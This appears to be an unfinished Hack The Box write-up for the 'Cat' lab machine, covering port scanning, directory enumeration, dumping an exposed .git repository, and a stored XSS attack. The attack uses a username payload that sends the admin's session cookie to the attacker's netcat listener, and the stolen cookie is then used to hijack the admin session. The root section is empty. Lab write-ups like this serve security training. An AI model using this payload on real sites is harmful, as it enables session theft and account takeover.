---
name: Cat
difficulty: medium
os: linux
platform: htb
date: 9999

img: https://labs.hackthebox.com/storage/avatars/bf7ae27f4e0ce1703bdd10d538334d9e.png
---

## Enumeration

We start by scanning the target machine for open ports using Nmap. We will use the `-p-` option to scan all ports and the `--open` option to filter out closed ports

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.11.53 -o allPorts
```
```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```
We can see that ports 22 and 80 are open, which are the SSH and HTTP services respectively.

Now we add to `/etc/hosts` the domain `cat.htb` pointing to the target IP address

```bash
echo "10.10.11.53 cat.htb" | sudo tee -a /etc/hosts
```

We try to get the SSH and HTTP services versions and script scanning using `-sC` and `-sV` options

```bash
nmap -p 22,80 -sCV -vvv 10.10.11.53 -o targeted
```
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 962df5c6f69f5960e56585ab49e47614 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/7/gBYFf93Ljst5b58XeNKd53hjhC57SgmM9qFvMACECVK0r/Z11ho0Z2xy6i9R5dX2G/HAlIfcu6i2QD9lILOnBmSaHZ22HCjjQKzSbbrnlcIcaEZiE011qtkVmtCd2e5zeVUltA9WCD69pco7BM29OU7FlnMN0iRlF8u962CaRnD4jni/zuiG5C2fcrTHWBxc/RIRELrfJpS3AjJCgEptaa7fsH/XfmOHEkNwOL0ZK0/tdbutmcwWf9dDjV6opyg4IK73UNIJSSak0UXHcCpv0GduF3fep3hmjEwkBgTg/EeZO1IekGssI7yCr0VxvJVz/Gav+snOZ/A1inA5EMqYHGK07B41+0rZo+EZZNbuxlNw/YLQAGuC5tOHt896wZ9tnFeqp3CpFdm2rPGUtFW0jogdda1pRmRy5CNQTPDd6kdtdrZYKqHIWfURmzqva7byzQ1YPjhI22cQ49M79A0yf4yOCPrGlNNzeNJkeZM/LU6p7rNJKxE9CuBAEoyh0=
|   256 9ec4a440e9dacc62d1d65a2f9e7bd4aa (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEmL+UFD1eC5+aMAOZGipV3cuvXzPFlhqtKj7yVlVwXFN92zXioVTMYVBaivGHf3xmPFInqiVmvsOy3w4TsRja4=
|   256 6e222a6a6debde19b71697c27e8929d5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEOCpb672fivSz3OLXzut3bkFzO4l6xH57aWuSu4RikE
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://cat.htb/
| http-methods: 
|_  Supported Methods: HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
We use `gobuster` to enumerate the directories and files in the web server

```bash
gobuster dir -u http://cat.htb -w /usr/share/wordlists/dirb/common.txt -t 50
```
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cat.htb
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.git/HEAD            (Status: 200) [Size: 23]
/.htaccess            (Status: 403) [Size: 272]
/admin.php            (Status: 302) [Size: 1] [--> /join.php]
/.htpasswd            (Status: 403) [Size: 272]
/.hta                 (Status: 403) [Size: 272]
/css                  (Status: 301) [Size: 300] [--> http://cat.htb/css/]
/img                  (Status: 301) [Size: 300] [--> http://cat.htb/img/]
/index.php            (Status: 200) [Size: 3075]
/server-status        (Status: 403) [Size: 272]
/uploads              (Status: 301) [Size: 304] [--> http://cat.htb/uploads/]
Progress: 4614 / 4615 (99.98%)[ERROR] Get "http://cat.htb/trailer": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 4614 / 4615 (99.98%)
[ERROR] Get "http://cat.htb/training": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
===============================================================
Finished
===============================================================
```

We can see that there is a `.git` directory, which may contain sensitive information. We can clone the repository using `git-dumper`: 

```bash
python git_dumper.py http://cat.htb/ dump
```

Now we have access to all files. 

- We can see there is a `sqlite` database in `/database/cat.db`

- User `axel` has admin privileges

- Username input is not sanitized, so we can XSS inject the username to get the admin session cookie

## User Exploitation

We create a new user `<script>window.location="http://10.10.14.90:4444?c="+document.cookie;</script>` and set up a listener on our machine to capture the cookie

```bash
nc -lvnp 4444
```

When we access the page and create a new cat registration, admin will be redirected to our listener with the cookie value

```
/?c=PHPSESSID=ekqn6ejte1ir158e68h75cmvjb
```

We can set the cookie in our browser and access the admin page at `http://cat.htb/admin.php`




## Root Exploitation

## Conclusion
